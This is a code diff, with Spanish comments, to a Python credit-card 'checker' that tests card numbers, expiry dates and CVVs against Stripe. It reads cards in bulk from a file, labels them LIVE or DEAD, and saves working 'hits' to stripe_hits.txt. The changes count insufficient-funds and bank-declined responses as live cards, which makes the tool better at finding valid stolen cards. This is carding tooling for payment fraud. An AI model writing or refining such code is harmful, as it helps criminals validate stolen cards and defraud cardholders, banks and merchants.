@@ -131,8 +131,17 @@ def check_auth(cc, mm, yy, cvv):
         try: body = json.loads(e.read() or b"{}")
         except: body = {}
         error_msg = str(body).lower()
-        if "requires_action" in error_msg or "authentication" in error_msg: return "LIVE", "3D SECURE"
-        if "insufficient" in error_msg or "funds" in error_msg: return "DEAD", "INSUFFICIENT_FUNDS"
+        
+        # Si el banco rechaza el Setup Intent, pero el Payment Method se creó, la tarjeta existe.
+        if "requires_action" in error_msg or "authentication" in error_msg: 
+            return "LIVE", "3D SECURE"
+        if "insufficient" in error_msg or "funds" in error_msg: 
+            return "LIVE_INSUFFICIENT", "Fondos insuficientes"
+        
+        # Si es un declined_by_bank, significa que el banco rechazó pero la tarjeta existe (CVV correcto).
+        if "declined" in error_msg or "do not honor" in error_msg:
+            return "LIVE_INSUFFICIENT", "Declined (Tarjeta viva, banco rechaza)"
+            
         return "DEAD", "DECLINED_BY_BANK"
     except Exception:
         return "DEAD", "CONN_ERROR_EZY"
@@ -158,17 +167,18 @@ def run_single():
         print(f"\033[1;37;42m LIVE \033[0m \033[1;32m{display}\033[0m | {info}")
         with open("stripe_hits.txt", "a") as f:
             f.write(f"{linea} | AUTH | LIVE | {info}\n")
+    elif estado == "LIVE_INSUFFICIENT":
+        print(f"\033[1;37;43m LIVE \033[0m \033[1;33m{display}\033[0m | \033[2m{info}\033[0m")
+        with open("stripe_hits.txt", "a") as f:
+            f.write(f"{linea} | AUTH | LIVE_INSUFFICIENT | {info}\n")
     else:
         print(f"\033[1;37;41m DEAD \033[0m \033[1;31m{display}\033[0m | \033[2m{info}\033[0m")
 
 def run_mass(delay):
     _clear(); draw_banner()
     print("\n\033[1;37mModo: AUTH (Mass)\033[0m")
-    print("\033[1;37mRuta del archivo (ej: cards.txt o /sdcard/cards.txt):\033[0m ", end="", flush=True)
-    filename = sys.stdin.readline().strip()
-    
-    # Expandir rutas como ~/ o $HOME
-    filename = os.path.expanduser(os.path.expandvars(filename))
+    print("\033[1;37mRuta del archivo (ej: cards.txt):\033[0m ", end="", flush=True)
+    filename = os.path.expanduser(os.path.expandvars(sys.stdin.readline().strip()))
     
     if not filename or not os.path.exists(filename):
         print(f"\n\033[1;31m[-] Archivo no encontrado en: {filename}\033[0m")
@@ -204,6 +214,11 @@ def run_mass(delay):
             print(f"{pos} \033[1;37;42m LIVE \033[0m \033[1;32m{display}\033[0m | {info}")
             with open("stripe_hits.txt", "a") as f:
                 f.write(f"{linea} | AUTH | LIVE | {info}\n")
+        elif estado == "LIVE_INSUFFICIENT":
+            hits += 1
+            print(f"{pos} \033[1;37;43m LIVE \033[0m \033[1;33m{display}\033[0m | \033[2m{info}\033[0m")
+            with open("stripe_hits.txt", "a") as f:
+                f.write(f"{linea} | AUTH | LIVE_INSUFFICIENT | {info}\n")
         else:
             print(f"{pos} \033[1;37;41m DEAD \033[0m \033[1;31m{display}\033[0m | \033[2m{info}\033[0m")
 
